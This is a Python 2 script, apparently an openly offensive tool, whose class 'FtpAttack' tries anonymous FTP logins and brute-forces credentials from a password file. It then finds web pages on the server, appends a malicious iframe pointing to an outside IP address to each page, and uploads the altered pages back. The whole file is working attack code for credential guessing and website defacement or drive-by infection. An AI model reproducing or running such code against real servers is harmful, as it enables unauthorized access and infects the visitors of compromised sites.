#!/usr/bin/python
# -*- coding: utf-8 -*-
import ftplib
import optparse
import time
class FtpAttack:  
 def __init__(self,ip):
  self.ip=ip
 def anonLogin(self):
    try:
        ftp = ftplib.FTP(self.ip)
        ftp.login('anonymous', 'me@your.com')
        print '\n[*] ' + str(hostname) \
            + ' FTP Anonymous Logon Succeeded.'
        ftp.quit()
        return True
    except Exception, e:
        print '\n[-] ' + str(hostname) +\
          ' FTP Anonymous Logon Failed.'
        return False


 def bruteLogin(self, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        #time.sleep(1)
        userName = line.split(':')[0]
        passWord = line.split(':')[1].rstrip('\n\r')
        print '[+] Trying: ' + userName + '/' + passWord
        try:
            ftp = ftplib.FTP(self.ip)
            ftp.login(userName, passWord)
            print '[+]'+str(self.ip) +' FTP Logon Succeeded: '+userName+'/'+passWord
            #ftp.quit()
            #return (userName, passWord)
            return ftp
        except Exception, e:
            pass
    print '\n[-] Could not brute force FTP credentials.'
    return (None, None)


 def returnDefault(self,ftp):
    try:
        dirList = ftp.nlst()
    except:
        dirList = []
        print '[-] Could not list directory contents.'
        print '[-] Skipping To Next Target.'
        return

    retList = []
    for fileName in dirList:
        fn = fileName.lower()
        if '.php' in fn or '.htm' in fn or '.asp' in fn:
            print  '[+]Found default page: ' + fileName
            retList.append(fileName)
    return retList


 def injectPage(self,ftp, page, redirect):
    f = open(page + '.tmp', 'w')
    ftp.retrlines('RETR ' + page, f.write)
    print  '[+] Downloaded Page: ' + page
    f.write(redirect)
    f.close()
    print  '[+]Injected Malicious IFrame on: ' + page
    ftp.storlines('STOR ' + page, open(page + '.tmp'))
    print  '[+]Uploaded Injected Page: ' + page


 def attack(self):
    redirect = '<iframe src='+ '"http:\\\\192.168.1.104:80\\"></iframe>'  
    ftp=self.bruteLogin("userpass.txt")  
    defPages = self.returnDefault(ftp)
    for defPage in defPages:
     self.injectPage(ftp, defPage, redirect)

    
   

